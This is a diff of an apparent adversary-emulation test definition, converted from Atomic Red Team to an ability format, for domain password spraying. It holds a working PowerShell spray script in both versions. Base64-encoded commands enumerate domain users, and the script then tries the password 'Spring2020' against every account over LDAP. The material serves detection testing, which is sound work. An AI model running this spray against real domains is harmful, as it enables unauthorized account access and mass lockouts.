@@ -1,28 +1,15 @@
-- id: 82f317b2-777e-59b7-842a-e73e2a01bc52
+- requirements: []
   name: Soumaia ART Tests - Password Spray Invoke-DomainPasswordSpray Light
   description: "Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) \nbut without all the extra code that makes the script get blocked by many AVs. \nThis atomic test will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout."
   tactic: credential-access
-  technique:
-    attack_id: T1110.003
-    name: 'Brute Force: Password Spraying'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACAAJABlAG4AdgA6AFQAZQBtAHAAXAB1AHMAZQByAHMAZABwAHMATABpAGcAaAB0AC4AdAB4AHQAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAC0ATgBvAE4AZQB3AEwAaQBuAGUAIAAiAFIAZQBhAGQAaQBuAGcAIABVAHMAZQByAHMALgAiACAAIwAgAHQAaABpAHMAIABjAG8AZABlACAAbQBvAGQAaQBmAGUAZAAgAGYAcgBvAG0AIABoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAFoAbwBvAG0AZQByAEgAdQBsAGsASABvAGcAYQBuAC8AUABvAHcAZQByAHMAaABlAGwAbAAtAEQAbwBtAGEAaQBuAC0AVQBzAGUAcgAtAEUAbgB1AG0AZQByAGEAdABpAG8AbgAKACQAbgBlAHQATwB1AHQAcAB1AHQAIAA9ACAAbgBlAHQAIAB1AHMAZQByAHMAIAAvAGQAbwBtAGEAaQBuAAoAJABuAGUAdABPAHUAdABwAHUAdAAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4AQQByAHIAYQB5AEwAaQBzAHQAXQAoACQAbgBlAHQATwB1AHQAcAB1AHQAWwA2AC4ALgAoACQAbgBlAHQATwB1AHQAcAB1AHQALgBsAGUAbgBnAHQAaAAtADMAKQBdACkACgAkAHUAcwBlAHIATABpAG0AaQB0ACAAPQAgADIAMAAwADsAIAAkAHUAcwBlAHIAYwBvAHUAbgB0ACAAPQAgADAACgBmAG8AcgBlAGEAYwBoACAAKAAkAGwAaQBuAGUAIABpAG4AIAAkAG4AZQB0AE8AdQB0AHAAdQB0ACkAIAB7AAoAIAAgAGkAZgAoACQAdQBzAGUAcgBjAG8AdQBuAHQAIAAtAGcAZQAgACQAdQBzAGUAcgBMAGkAbQBpAHQAKQB7AGIAcgBlAGEAawB9AAoAIAAgACQAbABpAG4AZQAgAD0AIAAkAGwAaQBuAGUALgB0AHIAaQBtACgAKQAKACAAIAAkAGwAaQBuAGUAIAA9ACAAJABsAGkAbgBlACAALQBzAHAAbABpAHQAIAAnAFwAcwBcAHMAKwAnAAoAIAAgAGYAbwByAGUAYQBjAGgAIAAoACQAdQBzAGUAcgAgAGkAbgAgACQAbABpAG4AZQApAHsACgAgACAAIAAgAGkAZgAoACQAdQBzAGUAcgBjAG8AdQBuAHQAIAAtAGcAZQAgACQAdQBzAGUAcgBMAGkAbQBpAHQAKQB7AGIAcgBlAGEAawB9AAoAIAAgACAAIABBAGQAZAAtAEMAbwBuAHQAZQBuAHQAIAAkAGUAbgB2ADoAVABlAG0AcABcAHUAcwBlAHIAcwBkAHAAcwBMAGkAZwBoAHQALgB0AHgAdAAgACQAdQBzAGUAcgAKACAAIAAgACAAJAB1AHMAZQByAGMAbwB1AG4AdAAgAD0AIAAkAHUAcwBlAHIAYwBvAHUAbgB0ACAAKwAgADEACgAgACAAIAAgAH0AIAAgAAoAfQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFUAcwBlAHIAbgBhAG0AZQBzACAAcwBhAHYAZQBkACAAdABvACAAJABlAG4AdgA6AFQAZQBtAHAAXAB1AHMAZQByAHMAZABwAHMATABpAGcAaAB0AC4AdAB4AHQAIgAKAA==
-          }
-          function Invoke-dpsLight ($Password, $userlist) {
-          $users = Get-Content $userlist
-          $Domain = "LDAP://" + ([ADSI]"").distinguishedName
-          foreach ($User in $users) {
-            $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
-            if ($Domain_check.name -ne $null) {
-              Write-Host -ForegroundColor Green "Password found for User:$User Password:$Password"
-            }
-            else { Write-Host ". " -NoNewline}
-          }
-          Write-Host -ForegroundColor green "Finished"
-          }
-          Invoke-dpsLight "Spring2020" $env:Temp\usersdpsLight.txt
+  technique_id: T1110.003
+  technique_name: 'Brute Force: Password Spraying'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACAAJABlAG4AdgA6AFQAZQBtAHAAXAB1AHMAZQByAHMAZABwAHMATABpAGcAaAB0AC4AdAB4AHQAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAC0ATgBvAE4AZQB3AEwAaQBuAGUAIAAiAFIAZQBhAGQAaQBuAGcAIABVAHMAZQByAHMALgAiACAAIwAgAHQAaABpAHMAIABjAG8AZABlACAAbQBvAGQAaQBmAGUAZAAgAGYAcgBvAG0AIABoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAFoAbwBvAG0AZQByAEgAdQBsAGsASABvAGcAYQBuAC8AUABvAHcAZQByAHMAaABlAGwAbAAtAEQAbwBtAGEAaQBuAC0AVQBzAGUAcgAtAEUAbgB1AG0AZQByAGEAdABpAG8AbgAKACQAbgBlAHQATwB1AHQAcAB1AHQAIAA9ACAAbgBlAHQAIAB1AHMAZQByAHMAIAAvAGQAbwBtAGEAaQBuAAoAJABuAGUAdABPAHUAdABwAHUAdAAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4AQQByAHIAYQB5AEwAaQBzAHQAXQAoACQAbgBlAHQATwB1AHQAcAB1AHQAWwA2AC4ALgAoACQAbgBlAHQATwB1AHQAcAB1AHQALgBsAGUAbgBnAHQAaAAtADMAKQBdACkACgAkAHUAcwBlAHIATABpAG0AaQB0ACAAPQAgADIAMAAwADsAIAAkAHUAcwBlAHIAYwBvAHUAbgB0ACAAPQAgADAACgBmAG8AcgBlAGEAYwBoACAAKAAkAGwAaQBuAGUAIABpAG4AIAAkAG4AZQB0AE8AdQB0AHAAdQB0ACkAIAB7AAoAIAAgAGkAZgAoACQAdQBzAGUAcgBjAG8AdQBuAHQAIAAtAGcAZQAgACQAdQBzAGUAcgBMAGkAbQBpAHQAKQB7AGIAcgBlAGEAawB9AAoAIAAgACQAbABpAG4AZQAgAD0AIAAkAGwAaQBuAGUALgB0AHIAaQBtACgAKQAKACAAIAAkAGwAaQBuAGUAIAA9ACAAJABsAGkAbgBlACAALQBzAHAAbABpAHQAIAAnAFwAcwBcAHMAKwAnAAoAIAAgAGYAbwByAGUAYQBjAGgAIAAoACQAdQBzAGUAcgAgAGkAbgAgACQAbABpAG4AZQApAHsACgAgACAAIAAgAGkAZgAoACQAdQBzAGUAcgBjAG8AdQBuAHQAIAAtAGcAZQAgACQAdQBzAGUAcgBMAGkAbQBpAHQAKQB7AGIAcgBlAGEAawB9AAoAIAAgACAAIABBAGQAZAAtAEMAbwBuAHQAZQBuAHQAIAAkAGUAbgB2ADoAVABlAG0AcABcAHUAcwBlAHIAcwBkAHAAcwBMAGkAZwBoAHQALgB0AHgAdAAgACQAdQBzAGUAcgAKACAAIAAgACAAJAB1AHMAZQByAGMAbwB1AG4AdAAgAD0AIAAkAHUAcwBlAHIAYwBvAHUAbgB0ACAAKwAgADEACgAgACAAIAAgAH0AIAAgAAoAfQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFUAcwBlAHIAbgBhAG0AZQBzACAAcwBhAHYAZQBkACAAdABvACAAJABlAG4AdgA6AFQAZQBtAHAAXAB1AHMAZQByAHMAZABwAHMATABpAGcAaAB0AC4AdAB4AHQAIgAKAA== }; function Invoke-dpsLight ($Password, $userlist) { $users = Get-Content $userlist; $Domain = "LDAP://" + ([ADSI]"").distinguishedName; foreach ($User in $users) { $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password); if ($Domain_check.name -ne $null) { Write-Host -ForegroundColor Green "Password found for User:$User Password:$Password" } else { Write-Host ". " -NoNewline} }; Write-Host -ForegroundColor green "Finished" }; Invoke-dpsLight "Spring2020" $env:Temp\usersdpsLight.txt
+  id: 82f317b2-777e-59b7-842a-e73e2a01bc52
